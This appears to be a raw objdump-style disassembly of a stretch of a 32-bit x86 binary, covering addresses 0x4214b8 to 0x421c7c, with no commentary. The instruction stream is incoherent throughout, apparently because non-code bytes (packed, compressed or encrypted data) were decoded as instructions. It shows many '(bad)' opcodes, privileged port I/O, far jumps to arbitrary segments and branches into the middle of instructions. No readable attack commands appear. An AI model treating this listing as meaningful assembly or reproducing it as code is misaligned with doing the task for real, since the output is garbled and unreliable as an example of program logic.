  4214b8:	pop    ds
  4214b9:	dec    ebp
  4214ba:	dec    edx
  4214bb:	cwde   
  4214bc:	test   eax,0xe0df8f07
  4214c1:	sbb    bh,BYTE PTR [esi]
  4214c3:	sub    al,0x6e
  4214c5:	mov    ds:0x42cc7f63,eax
  4214ca:	fstp   st(0)
  4214cc:	mov    ecx,cs
  4214ce:	inc    eax
  4214cf:	loopne 0x42147b
  4214d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214d2:	gs dec sp
  4214d5:	fcmovb st,st(6)
  4214d7:	cld    
  4214d8:	xchg   ebp,eax
  4214d9:	shl    BYTE PTR [edx-0x31],1
  4214dc:	adc    al,0x85
  4214de:	mov    bh,dl
  4214e0:	mov    eax,0x57acc962
  4214e5:	repnz dec edi
  4214e7:	or     edi,edi
  4214e9:	std    
  4214ea:	icebp  
  4214eb:	xor    dl,BYTE PTR [edi-0x3e4e46f5]
  4214f1:	cmp    DWORD PTR [eax],0xffffffdf
  4214f4:	xchg   ebx,eax
  4214f5:	inc    ecx
  4214f6:	push   0xfb373ade
  4214fb:	push   eax
  4214fc:	mov    ds:0xd0393771,ax
  421502:	pop    es
  421503:	fbstp  TBYTE PTR [edi+0x30]
  421506:	add    BYTE PTR [ebx+edx*4+0x4ccbda92],dh
  42150d:	lahf   
  42150e:	enter  0x18dd,0xf1
  421512:	mov    bl,0x50
  421514:	xor    al,dl
  421516:	int3   
  421517:	mov    edx,esi
  421519:	inc    eax
  42151a:	xchg   esp,eax
  42151b:	outs   dx,DWORD PTR ds:[esi]
  42151c:	repz js 0x42157c
  42151f:	shr    BYTE PTR fs:[edx+ecx*1-0x7ca375e4],cl
  421527:	rol    BYTE PTR ds:0x9cb26217,0xf
  42152e:	ret    0x221c
  421531:	and    al,0xf5
  421533:	inc    ebp
  421534:	int3   
  421535:	push   ds
  421536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421537:	push   esp
  421538:	xor    BYTE PTR [ecx],0xa0
  42153b:	sbb    eax,0xd5c9b568
  421540:	addr16 mov ebx,0x80140d8e
  421546:	xchg   edx,eax
  421547:	nop
  421548:	mov    eax,ds:0x7163deeb
  42154d:	iret   
  42154e:	(bad)  
  42154f:	in     eax,dx
  421550:	xchg   DWORD PTR [eax+ebx*4],esi
  421553:	or     DWORD PTR [eax-0x1],eax
  421556:	(bad)  
  421557:	lea    esi,[edi-0x2b9014cb]
  42155d:	clc    
  42155e:	or     eax,0xc392d8a2
  421563:	dec    esi
  421564:	imul   ebx,DWORD PTR [edi],0xffffffb5
  421567:	jl     0x4215da
  421569:	xor    dh,cl
  42156b:	mov    eax,ds:0x53f720a2
  421570:	jae    0x42150d
  421572:	mov    esi,0x4753fbb
  421577:	stos   BYTE PTR es:[edi],al
  421578:	inc    ebp
  421579:	jl     0x4215cf
  42157b:	add    bh,BYTE PTR [ebx]
  42157d:	mov    esi,0xfc61443b
  421582:	inc    edx
  421583:	mov    ah,0x93
  421585:	les    ebx,FWORD PTR [ecx-0x1d]
  421588:	and    ebp,DWORD PTR es:[ebp-0x54103864]
  42158f:	xchg   esp,eax
  421590:	xchg   esp,eax
  421591:	lea    edx,[edi-0x73]
  421594:	imul   BYTE PTR [edi]
  421596:	out    0xb0,al
  421598:	out    0x9d,eax
  42159a:	mov    ebx,DWORD PTR [ebx-0x65f9cac9]
  4215a0:	int3   
  4215a1:	iret   
  4215a2:	(bad)  
  4215a4:	fwait
  4215a5:	jle    0x421531
  4215a7:	pop    es
  4215a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215a9:	jecxz  0x42153e
  4215ab:	icebp  
  4215ac:	retf   
  4215ad:	stc    
  4215ae:	mov    ds:0x5225747b,eax
  4215b3:	mov    edi,0xd30cfd2c
  4215b8:	retf   
  4215b9:	push   ebp
  4215ba:	add    DWORD PTR [ecx+0x5a],ebx
  4215bd:	aam    0x3a
  4215bf:	(bad)  
  4215c0:	dec    edx
  4215c1:	imul   edi,ecx,0x7eb69faf
  4215c7:	and    BYTE PTR [ebp-0x9],dh
  4215ca:	xchg   ebp,eax
  4215cb:	(bad)  
  4215cc:	pop    eax
  4215cd:	rol    BYTE PTR [edx-0x5ac690cb],cl
  4215d3:	int3   
  4215d4:	jae    0x4215a0
  4215d6:	(bad)  
  4215d8:	jb     0x42160f
  4215da:	xor    al,0x25
  4215dc:	test   eax,0x17cb5208
  4215e1:	rcl    dl,cl
  4215e3:	lock xor DWORD PTR [ebp-0x61b6e82c],0x74
  4215eb:	xchg   DWORD PTR [edi-0x49a32d70],ebp
  4215f1:	imul   edi,DWORD PTR [edx+0x5],0xc4b543ab
  4215f8:	test   al,0x4c
  4215fa:	jg     0x4215ed
  4215fc:	sub    eax,0xef637521
  421601:	std    
  421602:	fsub   st(7),st
  421604:	xor    DWORD PTR [esi-0x1c05831e],0xffffff8b
  42160b:	cdq    
  42160c:	ror    BYTE PTR [eax+edx*8-0x58],1
  421610:	sub    BYTE PTR [eax],bl
  421612:	adc    ecx,DWORD PTR [esi-0x7]
  421615:	fld    QWORD PTR [esi-0x6b29edfd]
  42161b:	ret    0xeb71
  42161e:	adc    DWORD PTR [edi-0x59dd3951],edi
  421624:	jmp    0xbb177834
  421629:	iret   
  42162a:	push   0x13
  42162c:	shl    DWORD PTR [edi],cl
  42162e:	jae    0x4216ac
  421630:	inc    ebx
  421631:	shl    ebx,1
  421633:	push   eax
  421634:	xor    edx,eax
  421636:	mov    dh,0xb6
  421638:	js     0x4216a8
  42163a:	daa    
  42163b:	loop   0x42165f
  42163d:	pop    ebp
  42163e:	sbb    bl,BYTE PTR [edx-0x3084b591]
  421644:	hlt    
  421645:	ja     0x4216bd
  421647:	jb     0x42164d
  421649:	in     al,0x1a
  42164b:	sub    al,cl
  42164d:	or     al,0x2f
  42164f:	and    eax,0x6a62f95f
  421654:	sub    eax,DWORD PTR [esi-0x6d]
  421657:	cmp    eax,0xda477efc
  42165c:	add    cl,bl
  42165e:	(bad)  
  42165f:	shl    BYTE PTR [edx],0xcb
  421662:	xchg   ebx,eax
  421663:	test   DWORD PTR [esi],0x6c065a99
  421669:	mov    ah,0x38
  42166b:	sbb    al,0x3e
  42166d:	cmc    
  42166e:	inc    ecx
  42166f:	sbb    ebp,ebp
  421671:	ret    
  421672:	mov    di,0x1043
  421676:	inc    esp
  421677:	(bad)  
  421678:	mov    ch,BYTE PTR [ebp-0x3da3e9b2]
  42167e:	sbb    al,0xc0
  421680:	fnstsw WORD PTR [eax]
  421682:	in     eax,dx
  421683:	xchg   esp,eax
  421684:	add    DWORD PTR [esi],0xfffffffc
  421687:	stos   BYTE PTR es:[edi],al
  421688:	mov    ebx,0x94f7106a
  42168d:	mov    dh,0xbc
  42168f:	and    eax,esp
  421691:	fcom   QWORD PTR [edi+0x62]
  421694:	add    eax,0xd
  421697:	lahf   
  421698:	mov    ch,0x58
  42169a:	pop    ecx
  42169b:	lods   al,BYTE PTR ds:[esi]
  42169c:	mov    ecx,0x1d0cfda7
  4216a1:	sub    al,0xfb
  4216a3:	js     0x4216a5
  4216a5:	jmp    0x71ee4562
  4216aa:	test   eax,0x5e96c60c
  4216af:	(bad)  
  4216b0:	push   esi
  4216b1:	dec    edx
  4216b2:	outs   dx,BYTE PTR ds:[esi]
  4216b3:	out    0x76,eax
  4216b5:	(bad)  
  4216b7:	fcom   DWORD PTR [edx-0x785cf6f8]
  4216bd:	cmp    al,0x4f
  4216c0:	xchg   esi,eax
  4216c1:	dec    esi
  4216c2:	dec    ecx
  4216c3:	jo     0x421657
  4216c5:	or     al,0xac
  4216c7:	cmp    BYTE PTR [edx-0x16de2b5c],ch
  4216cd:	lahf   
  4216ce:	nop
  4216cf:	mov    esi,0xb8e877f
  4216d4:	fnstenv [esi]
  4216d6:	adc    eax,DWORD PTR [edi+0xa6724ba]
  4216dc:	xor    DWORD PTR [ecx-0x4f86f44b],0x8a6402ca
  4216e6:	xchg   BYTE PTR [ebx],cl
  4216e8:	cmc    
  4216e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216ea:	aad    0x31
  4216ec:	inc    eax
  4216ed:	inc    esi
  4216ee:	sub    dh,BYTE PTR [eax]
  4216f0:	sbb    DWORD PTR [esi+0xecce0b7],edx
  4216f6:	(bad)
  4216fb:	js     0x421776
  4216fd:	imul   DWORD PTR [esi]
  4216ff:	es shr ebx,0x44
  421703:	jns    0x421748
  421705:	and    BYTE PTR [ecx],dh
  421707:	shl    BYTE PTR [ebp+0x17bd5545],1
  42170d:	push   edi
  42170e:	(bad)  
  421710:	leave  
  421711:	es sub eax,0xeff9a545
  421717:	add    bl,BYTE PTR fs:[edi+0x41f244d3]
  42171e:	adc    BYTE PTR [edx+0x633aed58],al
  421724:	jg     0x4216b4
  421726:	daa    
  421727:	in     al,dx
  421728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421729:	test   al,dh
  42172b:	(bad)  
  42172c:	(bad)  
  42172d:	push   ds
  42172e:	clc    
  42172f:	add    BYTE PTR [ebx+0x11],al
  421732:	mov    edx,0x1e75673e
  421737:	hlt    
  421738:	jmp    0xfde820f0
  42173d:	retf   0xdb68
  421740:	out    0x2f,eax
  421742:	not    BYTE PTR [edi]
  421744:	das    
  421745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421746:	idiv   BYTE PTR [ecx-0x1674e376]
  42174c:	pop    edx
  42174d:	and    ch,BYTE PTR [edi+0x7257f47a]
  421753:	les    esp,FWORD PTR [eax]
  421755:	idiv   BYTE PTR [edi-0x60]
  421758:	lods   eax,DWORD PTR ds:[esi]
  421759:	int3   
  42175a:	mov    WORD PTR [ebp-0x73],ss
  42175d:	jne    0x42179a
  42175f:	mov    ecx,0x80d58589
  421764:	fs cmc 
  421766:	lock xchg edi,eax
  421768:	jb     0x4217e7
  42176a:	and    DWORD PTR es:[ecx-0x77eb25c7],edi
  421771:	push   eax
  421772:	out    dx,al
  421773:	dec    edx
  421774:	jecxz  0x42170e
  421776:	(bad)  
  421777:	jge    0x4217d7
  421779:	cld    
  42177a:	cmp    dh,BYTE PTR [ebx-0x65b85fd5]
  421780:	jmp    0x891d:0xa6e764e9
  421787:	jno    0x4217fb
  421789:	or     eax,0x4c46f2f
  42178e:	fidiv  DWORD PTR [esi+0x368096bf]
  421794:	xchg   ebp,eax
  421795:	fcomp  QWORD PTR [esi-0x7d]
  421798:	(bad)  
  42179a:	loopne 0x421729
  42179c:	sub    ah,BYTE PTR [edi-0x6f]
  42179f:	fcom   QWORD PTR [ebp-0x71020426]
  4217a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217a6:	je     0x421749
  4217a8:	lods   eax,DWORD PTR ds:[esi]
  4217a9:	cmp    bh,BYTE PTR [edx+ebx*1+0x65]
  4217ad:	and    al,0x31
  4217af:	pop    ecx
  4217b0:	add    dl,cl
  4217b2:	sbb    eax,0x99043956
  4217b7:	cwde   
  4217b8:	cs push ecx
  4217ba:	(bad)  
  4217bb:	in     eax,dx
  4217bc:	jno    0x421782
  4217be:	js     0x421787
  4217c0:	add    al,0xce
  4217c2:	mov    ebp,0x428026cb
  4217c7:	in     eax,dx
  4217c8:	fnsave [esi+0x39]
  4217cb:	loope  0x42180f
  4217cd:	fstp   st(1)
  4217cf:	cld    
  4217d0:	std    
  4217d1:	in     al,dx
  4217d2:	dec    edi
  4217d3:	out    0xba,eax
  4217d5:	addr16 (bad) 
  4217d7:	xor    eax,0xd4bf220d
  4217dc:	retf   
  4217dd:	or     dl,bh
  4217df:	repz cmp edi,DWORD PTR [eax-0x581805f4]
  4217e6:	inc    esp
  4217e7:	fisubr WORD PTR [edi-0x2b]
  4217ea:	outs   dx,DWORD PTR ds:[esi]
  4217eb:	pop    ebp
  4217ec:	(bad)  
  4217ed:	shl    edx,1
  4217ef:	mov    dh,0xb7
  4217f1:	out    0xb,eax
  4217f3:	mov    BYTE PTR [ecx+0x3245b7c7],cl
  4217f9:	jmp    0x92637c7
  4217fe:	out    0x91,eax
  421800:	xchg   ebp,eax
  421801:	clc    
  421802:	dec    edi
  421803:	adc    BYTE PTR [esi+ebx*8-0x2dc32c4d],bl
  42180a:	add    DWORD PTR [ecx+0x78],edx
  42180d:	or     eax,esp
  42180f:	jle    0x42182c
  421811:	aam    0x1d
  421813:	loopne 0x42181d
  421815:	popf   
  421816:	mov    WORD PTR [edi-0xa294dd1],?
  42181c:	jp     0x4217bc
  42181e:	push   ecx
  42181f:	push   esp
  421820:	hlt    
  421821:	nop
  421822:	jb     0x42189f
  421824:	inc    esi
  421825:	cmp    DWORD PTR [ebx],ebp
  421827:	iret   
  421828:	xor    bh,dl
  42182a:	retf   
  42182b:	push   cs
  42182c:	mov    ebx,0x94fa8fa7
  421831:	push   ss
  421832:	push   es
  421833:	and    BYTE PTR [esi-0x6d],al
  421836:	mov    dl,0xb
  421838:	jb     0x421832
  42183a:	mov    cl,0x9
  42183c:	dec    esi
  42183d:	mov    al,ds:0x369ddad4
  421842:	mov    dh,0x1
  421844:	cwde   
  421845:	aam    0x1
  421847:	adc    al,0xde
  421849:	mov    eax,eax
  42184b:	xchg   BYTE PTR [eax],ah
  42184d:	outs   dx,DWORD PTR ds:[esi]
  42184e:	mov    edx,0xf5c3e6ed
  421853:	cmp    al,0x9b
  421855:	mov    ds:0x5fc148d3,al
  42185a:	push   0x36
  42185c:	fimul  WORD PTR [esi-0x247b5d8f]
  421862:	and    eax,0x33a62b9a
  421867:	shl    DWORD PTR [edx-0x4888de6c],cl
  42186d:	push   esp
  42186e:	lds    ebx,FWORD PTR [ecx]
  421870:	push   cs
  421871:	ins    DWORD PTR es:[edi],dx
  421872:	jbe    0x421830
  421874:	inc    ebx
  421875:	xchg   DWORD PTR [edi+0x3f2fff4],eax
  42187b:	adc    al,0x32
  42187d:	jmp    0x42181f
  42187f:	in     al,0x1b
  421881:	jmp    0xf444:0xe2447f63
  421888:	inc    eax
  421889:	mov    ds:0x5a7788cc,al
  42188e:	into   
  42188f:	sub    bl,ch
  421891:	xchg   edx,eax
  421892:	cmp    BYTE PTR [edi],bh
  421894:	add    DWORD PTR [edi+0x4add4481],esi
  42189a:	xchg   ebx,eax
  42189b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42189c:	mov    edi,0xaf784932
  4218a1:	aas    
  4218a2:	jb     0x42187f
  4218a4:	in     eax,0xbe
  4218a6:	and    ebx,DWORD PTR [edx+edi*2-0x6]
  4218aa:	sub    BYTE PTR [esi],ah
  4218ac:	sub    cl,ah
  4218ae:	fisub  WORD PTR [esp+eiz*2-0x247501d3]
  4218b5:	mov    dh,0xef
  4218b7:	inc    esi
  4218b8:	ins    DWORD PTR es:[edi],dx
  4218b9:	inc    edi
  4218ba:	mov    ch,0xab
  4218bc:	xlat   BYTE PTR ds:[ebx]
  4218bd:	nop
  4218be:	ficom  DWORD PTR [ebp-0x59]
  4218c1:	jo     0x421891
  4218c3:	lods   eax,DWORD PTR ds:[esi]
  4218c4:	aas    
  4218c5:	loope  0x4218ec
  4218c7:	iret   
  4218c8:	fmul   QWORD PTR [esp+ebx*4]
  4218cb:	jbe    0x421889
  4218cd:	rcr    DWORD PTR [esi],1
  4218cf:	inc    edx
  4218d0:	inc    esi
  4218d1:	test   dh,dh
  4218d3:	std    
  4218d4:	les    esp,FWORD PTR [ecx-0x49]
  4218d7:	or     DWORD PTR [edx-0x13],edx
  4218da:	adc    cl,BYTE PTR [ecx+0x74]
  4218dd:	loop   0x42190e
  4218df:	or     eax,0x48ee698
  4218e4:	scas   eax,DWORD PTR es:[edi]
  4218e5:	sub    al,0xd3
  4218e7:	jo     0x42188c
  4218e9:	and    eax,0x3884fa92
  4218ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218ef:	shr    BYTE PTR [ebx+0x4331c737],0x56
  4218f6:	or     edx,eax
  4218f8:	sbb    al,0x9
  4218fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218fb:	dec    edx
  4218fc:	adc    BYTE PTR [edx-0x1f],bl
  4218ff:	push   ss
  421900:	ficomp DWORD PTR [edi+ebp*2-0x3c]
  421904:	fidivr DWORD PTR [edx+0x51]
  421907:	(bad)  
  421908:	addr16 mov cl,0x48
  42190b:	fnstsw WORD PTR [eax+ebp*2]
  42190e:	push   esp
  42190f:	sub    DWORD PTR [ecx-0x3f],ebp
  421912:	out    0x97,eax
  421914:	outs   dx,BYTE PTR ds:[esi]
  421915:	sub    eax,DWORD PTR [ecx]
  421917:	inc    ecx
  421918:	mov    edx,DWORD PTR [esi+0xd323262]
  42191e:	pop    ss
  42191f:	adc    ch,BYTE PTR [eax+0x7c0fbd72]
  421925:	pop    eax
  421926:	stos   DWORD PTR es:[edi],eax
  421927:	add    eax,0xb7ef4e81
  42192c:	lds    edi,FWORD PTR [edx]
  42192e:	lods   al,BYTE PTR ds:[esi]
  42192f:	(bad)  
  421930:	ret    0xb049
  421933:	adc    eax,0xce5d9339
  421938:	mov    WORD PTR [ecx],ds
  42193a:	test   BYTE PTR [eax-0x4c],0x36
  42193e:	adc    al,0x7b
  421940:	or     al,0xd6
  421942:	xor    dh,dl
  421944:	in     al,0xbf
  421946:	or     dl,BYTE PTR [ecx+0x5f]
  421949:	cs inc ebp
  42194b:	xchg   edi,ebp
  42194d:	xor    bh,BYTE PTR ds:0xf20ea73
  421953:	push   edx
  421954:	test   BYTE PTR [eax+0x7815434d],0xde
  42195b:	or     edx,DWORD PTR [ecx-0x49]
  42195e:	into   
  42195f:	ja     0x421947
  421961:	(bad)  
  421962:	mov    bh,0xe1
  421964:	sahf   
  421965:	and    DWORD PTR [eax+eiz*2],eax
  421968:	stc    
  421969:	xor    bl,BYTE PTR [esi+0x5a]
  42196c:	ret    
  42196d:	daa    
  42196e:	pop    ss
  42196f:	pop    edi
  421970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421971:	aad    0x87
  421973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421974:	add    bl,BYTE PTR ss:[edx-0x7b]
  421978:	test   BYTE PTR [edx+0x27],dl
  42197b:	pusha  
  42197c:	push   es
  42197d:	push   ss
  42197e:	xchg   edi,eax
  42197f:	out    dx,al
  421980:	mov    DWORD PTR [eax],edx
  421982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421983:	(bad)  [edx+ecx*1-0x2f]
  421987:	shr    edx,cl
  421989:	rcr    ebp,cl
  42198b:	into   
  42198c:	retf   0x8e86
  42198f:	push   edi
  421990:	sbb    eax,0x29914f0
  421995:	inc    ebx
  421996:	push   eax
  421997:	aam    0x55
  421999:	push   es
  42199a:	popa   
  42199b:	je     0x4219e4
  42199d:	jmp    0x24f9:0x79db3988
  4219a4:	adc    cl,BYTE PTR [edx]
  4219a6:	cld    
  4219a7:	out    0x38,al
  4219a9:	jecxz  0x4219fb
  4219ab:	mov    ds:0x93a70882,eax
  4219b0:	aas    
  4219b1:	imul   edi,DWORD PTR ds:[ebx],0xffffffdc
  4219b5:	mov    dh,0x33
  4219b7:	test   BYTE PTR [ecx+0x6a638865],dl
  4219bd:	add    dh,BYTE PTR [edx]
  4219bf:	sub    al,al
  4219c1:	push   es
  4219c2:	dec    esp
  4219c3:	sahf   
  4219c4:	ja     0x4219f4
  4219c6:	cld    
  4219c7:	push   ss
  4219c8:	jno    0x421a36
  4219ca:	stos   DWORD PTR es:[edi],eax
  4219cb:	adc    esi,DWORD PTR [ebp+edx*2+0x2d9040ad]
  4219d2:	sub    cl,dh
  4219d4:	mov    edi,0xd658f30
  4219d9:	dec    esp
  4219da:	aas    
  4219db:	push   ecx
  4219dc:	and    BYTE PTR [eax+0x4e],bh
  4219df:	ss xchg ebx,eax
  4219e1:	mov    edx,0xc303d927
  4219e6:	adc    al,ch
  4219e8:	adc    BYTE PTR [ebp-0x24],dh
  4219eb:	xor    eax,0x1ca5c5ba
  4219f0:	and    al,BYTE PTR [ebx-0x53058b64]
  4219f6:	cwde   
  4219f7:	inc    esp
  4219f8:	inc    ecx
  4219f9:	jg     0x421990
  4219fb:	adc    BYTE PTR [eax],dh
  4219fd:	shr    BYTE PTR [esi],1
  4219ff:	in     eax,dx
  421a00:	mov    ?,WORD PTR [edi]
  421a02:	nop
  421a03:	sti    
  421a04:	adc    dh,ch
  421a06:	mov    ds:0xe2b25166,al
  421a0b:	fs cmp ah,bh
  421a0e:	mov    al,ds:0xd305d79d
  421a13:	pop    ebx
  421a14:	dec    edx
  421a15:	out    dx,eax
  421a16:	or     bl,BYTE PTR [edx]
  421a18:	ds into 
  421a1a:	mov    esi,0xe599647d
  421a1f:	xor    al,0x8d
  421a21:	dec    ebp
  421a22:	fstp   TBYTE PTR [edx]
  421a24:	push   0x7539024f
  421a29:	fistp  QWORD PTR [edx]
  421a2b:	test   BYTE PTR [eax],al
  421a2d:	xchg   esi,eax
  421a2e:	sbb    eax,0x362fd020
  421a33:	xchg   ebx,eax
  421a34:	hlt    
  421a35:	stos   DWORD PTR es:[edi],eax
  421a36:	ins    BYTE PTR es:[edi],dx
  421a37:	jmp    0x31dbcfb8
  421a3c:	or     DWORD PTR [edi],eax
  421a3e:	cmp    BYTE PTR [eax+ebx*8+0x230abf5],0xe1
  421a46:	jl     0x421a5f
  421a48:	xor    al,0xb4
  421a4a:	shl    DWORD PTR [ecx],cl
  421a4c:	xchg   BYTE PTR [edi],bh
  421a4e:	popf   
  421a4f:	mov    bl,0xa2
  421a51:	xor    BYTE PTR [edi],bl
  421a53:	stc    
  421a54:	jle    0x421a03
  421a56:	ja     0x421a48
  421a58:	push   cs
  421a59:	ror    DWORD PTR [ebp+0x5067387d],1
  421a5f:	fdivp  st(0),st
  421a61:	or     edi,edi
  421a63:	jae    0x4219ea
  421a65:	adc    BYTE PTR [ebx+0x28fcc4a7],ah
  421a6b:	push   ecx
  421a6c:	addr16 dec eax
  421a6e:	push   ds
  421a6f:	aaa    
  421a70:	ins    DWORD PTR es:[edi],dx
  421a71:	push   ecx
  421a72:	in     al,dx
  421a73:	push   esp
  421a74:	mov    cs:0xa35df1de,eax
  421a7a:	fidivr WORD PTR [edi+edi*1]
  421a7d:	pop    edx
  421a7e:	mov    edi,0xcc6f92b8
  421a83:	call   0xf224:0x822d1e13
  421a8a:	jno    0x421aa6
  421a8c:	or     al,0x64
  421a8e:	(bad)  
  421a8f:	jno    0x421a54
  421a91:	and    esi,DWORD PTR [ecx+eax*1-0x21]
  421a95:	loope  0x421a67
  421a97:	xor    BYTE PTR [ecx+eiz*1],ah
  421a9a:	ret    0x354e
  421a9d:	mov    esi,0x3fa1777b
  421aa2:	cld    
  421aa3:	popa   
  421aa4:	dec    eax
  421aa5:	jmp    0x1ccc2f73
  421aaa:	test   eax,0x17c8394c
  421aaf:	adc    DWORD PTR [edx+esi*1+0xea529ea],esp
  421ab6:	xchg   DWORD PTR [ecx],esi
  421ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ab9:	cmp    BYTE PTR [ebp+edi*2-0x8],ah
  421abd:	fiadd  DWORD PTR [esi+0x28]
  421ac0:	fidivr DWORD PTR [edi-0x65]
  421ac3:	push   ebp
  421ac4:	ret    0x20cc
  421ac7:	xor    BYTE PTR ds:0x2a604423,bh
  421acd:	sti    
  421ace:	imul   edx,edx,0xa7e41412
  421ad4:	pop    ss
  421ad5:	mov    ?,WORD PTR [bp+si+0x4a5d]
  421ada:	push   esp
  421adb:	fsub   st,st(7)
  421add:	jmp    eax
  421adf:	fcmovb st,st(1)
  421ae1:	je     0x421b3d
  421ae3:	call   0xde43:0x133bb66a
  421aea:	inc    edi
  421aeb:	dec    esi
  421aec:	test   al,0x2
  421aee:	ds xor cl,cl
  421af1:	cli    
  421af2:	xchg   edx,eax
  421af3:	xor    DWORD PTR [ecx],esp
  421af5:	and    DWORD PTR [eax-0x33666841],0xac9c84e9
  421aff:	inc    esi
  421b00:	mov    edi,0x871813fc
  421b05:	addr16 repz inc ebp
  421b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b09:	mov    ch,0x2a
  421b0b:	cmp    eax,0x28861235
  421b10:	aad    0x20
  421b12:	dec    eax
  421b13:	and    al,0x40
  421b15:	mov    BYTE PTR gs:[ecx-0x6c],dl
  421b19:	cmp    al,0x91
  421b1b:	retf   0xc063
  421b1e:	cmp    edx,DWORD PTR [ecx-0x4b]
  421b21:	test   eax,0xf1e4d7f
  421b26:	rol    BYTE PTR [ebx-0x7613e3c],1
  421b2c:	lds    edi,FWORD PTR [ecx+0x49]
  421b2f:	rcr    DWORD PTR [ecx-0x19],cl
  421b32:	jmp    0x5e92:0x8a2ef3db
  421b39:	sub    cl,BYTE PTR [eax+0x5d1a5bcb]
  421b3f:	jmp    DWORD PTR ds:0x316bc4ff
  421b45:	inc    esi
  421b46:	aas    
  421b47:	sub    DWORD PTR [ebx-0x3d6fefdb],ebx
  421b4d:	push   eax
  421b4e:	sub    DWORD PTR [ebx-0x31],ebx
  421b51:	fdivr  st(4),st
  421b53:	adc    ch,BYTE PTR [ebx+0x1365fd0d]
  421b59:	pushf  
  421b5a:	shr    ebx,1
  421b5c:	mov    eax,0xc3a9a7ad
  421b61:	aaa    
  421b62:	inc    esi
  421b63:	xchg   esi,eax
  421b64:	push   0x2
  421b66:	xchg   ecx,eax
  421b67:	xor    eax,0xdaee80e9
  421b6c:	push   esi
  421b6d:	loopne 0x421bc9
  421b6f:	mov    ebx,fs
  421b71:	int3   
  421b72:	out    dx,al
  421b73:	popf   
  421b74:	cmp    DWORD PTR [esp+edx*2+0x47],ebp
  421b78:	fwait
  421b79:	pop    ss
  421b7a:	dec    dx
  421b7c:	dec    edi
  421b7d:	clc    
  421b7e:	sbb    eax,0xde915ffc
  421b83:	pop    ds
  421b84:	mov    dl,0x20
  421b86:	mov    edi,0x14f5d47d
  421b8b:	gs cmp dh,cl
  421b8e:	in     eax,0x9
  421b90:	cdq    
  421b91:	inc    ebx
  421b92:	pop    ss
  421b93:	dec    esp
  421b94:	add    BYTE PTR [eax+0x6e9cbd08],0x2
  421b9b:	call   0x97e3:0xc4e3aab6
  421ba2:	jmp    esp
  421ba4:	jne    0x421bee
  421ba6:	mov    eax,ds:0x6978d87c
  421bab:	or     dl,al
  421bad:	xor    BYTE PTR [edi],al
  421baf:	aaa    
  421bb0:	loop   0x421bee
  421bb2:	in     al,0x60
  421bb4:	mov    dh,0x2d
  421bb6:	fwait
  421bb7:	hlt    
  421bb8:	mov    esp,0xe92fb1ed
  421bbd:	dec    esi
  421bbe:	mov    dh,bh
  421bc0:	jmp    FWORD PTR [edx-0x60]
  421bc3:	add    al,0x71
  421bc5:	fwait
  421bc6:	(bad)  
  421bc7:	jmp    0x701d13
  421bcc:	cs fcmovne st,st(0)
  421bcf:	add    BYTE PTR [ecx+0x4b],bh
  421bd2:	adc    ch,BYTE PTR [esi]
  421bd4:	adc    ah,BYTE PTR [ebp+esi*1-0xa78d056]
  421bdb:	outs   dx,BYTE PTR ds:[esi]
  421bdc:	mov    ebx,DWORD PTR [ecx]
  421bde:	pop    eax
  421bdf:	jmp    0xe0ae:0xc9e9e29c
  421be6:	iret   
  421be7:	arpl   WORD PTR [edx+0x2a],si
  421bea:	cmp    eax,edi
  421bec:	sub    al,0x78
  421bee:	daa    
  421bef:	and    BYTE PTR [edi],dh
  421bf1:	clc    
  421bf2:	or     edx,DWORD PTR [eax+eax*8+0x31]
  421bf6:	add    eax,0x14c90752
  421bfb:	out    dx,eax
  421bfc:	jg     0x421c03
  421bfe:	scas   al,BYTE PTR es:[edi]
  421bff:	push   ss
  421c00:	leave  
  421c01:	push   esi
  421c02:	shl    BYTE PTR [ecx+0x8],cl
  421c05:	fidiv  DWORD PTR [edi-0x1f15dbc2]
  421c0b:	pushf  
  421c0c:	(bad)  
  421c0e:	xor    ebp,DWORD PTR [ecx]
  421c10:	mov    ebx,DWORD PTR [eax+0x6e]
  421c13:	or     BYTE PTR [edi-0x4a11723b],0x22
  421c1a:	fisttp WORD PTR [edx]
  421c1c:	call   0x42c8c723
  421c21:	sbb    dh,BYTE PTR [esi+0x6b]
  421c24:	or     ebx,eax
  421c26:	int3   
  421c27:	mov    edx,0x7dae2aea
  421c2c:	loop   0x421c5f
  421c2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c2f:	pop    di
  421c31:	les    ecx,FWORD PTR [esp+edi*8]
  421c34:	mov    ebp,0x32e0c1ff
  421c39:	into   
  421c3a:	push   ebx
  421c3b:	mov    BYTE PTR [edi+0x5a],dh
  421c3e:	jo     0x421c14
  421c40:	xchg   al,dl
  421c42:	fs aaa 
  421c44:	inc    eax
  421c45:	push   0x5
  421c47:	stos   BYTE PTR es:[edi],al
  421c48:	push   ds
  421c49:	in     al,0x6b
  421c4b:	test   BYTE PTR [edi],al
  421c4d:	push   esi
  421c4e:	sub    eax,0x989f748f
  421c53:	ret    
  421c54:	test   DWORD PTR [ecx+0x43],esi
  421c57:	xchg   edi,eax
  421c58:	ins    DWORD PTR es:[edi],dx
  421c59:	cld    
  421c5a:	jae    0x421c66
  421c5c:	outs   dx,BYTE PTR ds:[esi]
  421c5d:	or     esi,ebx
  421c5f:	mov    eax,0xd3091e1b
  421c64:	push   esi
  421c65:	addr16 in al,0x48
  421c68:	outs   dx,BYTE PTR ds:[esi]
  421c69:	ret    0x1bf1
  421c6c:	adc    eax,0x30e1354c
  421c71:	push   ebp
  421c72:	jge    0x421c23
  421c74:	push   edx
  421c75:	sbb    BYTE PTR [edi-0x1b],dh
  421c78:	xchg   ebx,eax
  421c79:	icebp  
  421c7a:	fild   WORD PTR [eax]
  421c7c:	inc    ebp
